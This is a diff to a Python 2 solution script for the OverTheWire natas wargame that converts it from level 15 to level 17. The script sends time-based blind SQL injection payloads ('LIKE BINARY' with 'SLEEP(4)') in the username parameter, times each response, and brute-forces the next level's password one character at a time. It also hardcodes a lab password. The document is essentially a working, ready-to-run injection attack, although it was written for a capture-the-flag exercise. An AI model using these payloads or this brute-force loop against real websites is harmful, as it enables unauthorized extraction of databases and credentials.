@@ -1,37 +1,46 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 """
-  level15.py
-  Solution for natas level15
+  level17.py
+  Solution for natas level17
 """
 __author__ = 'kall.micke@gmail.com'
 
 import requests
+import datetime
 import sys
 import os
 import re
 
-level = 15
+level = 17
 user = 'natas%s' % level
 host = 'http://natas%s.natas.labs.overthewire.org' % level
-password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
 
 def bruteforce_blind_injection():
 
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    parsedChars = ''
-   existMsg = 'This user exists.'
    flag = ''
 
    for c in chars:
-       r = requests.get(host + '?username=natas16" AND password LIKE BINARY "%' + c + '%" "', auth=(user, password))
-       if r.content.find(existMsg) != -1:
+       t1 = datetime.datetime.now()
+       r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + c + '%" AND SLEEP(4)=0 AND "V"="V', auth=(user, password))
+
+       t2 = datetime.datetime.now()    
+
+       if (t2 - t1).seconds > 3:
            parsedChars += c
+	   print 'ValidChars: {0}\r'.format(parsedChars),
+	   sys.stdout.flush()
 
    for i in range(32):
        for c in parsedChars:
-           r = requests.get(host+'?username=natas16" AND password LIKE BINARY "' + flag + c + '%" "', auth=(user, password))
-           if r.content.find(existMsg) != -1:
+	  t1 = datetime.datetime.now()
+          r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + flag + c + '%" AND SLEEP(4)=0 AND "V"="V', auth=(user, password))
+	  t2 = datetime.datetime.now()
+
+          if (t2 - t1).seconds > 3:
               flag += c
               print 'Flag: {0}\r'.format(flag + '*' * int(32 - len(flag))),
               sys.stdout.flush()
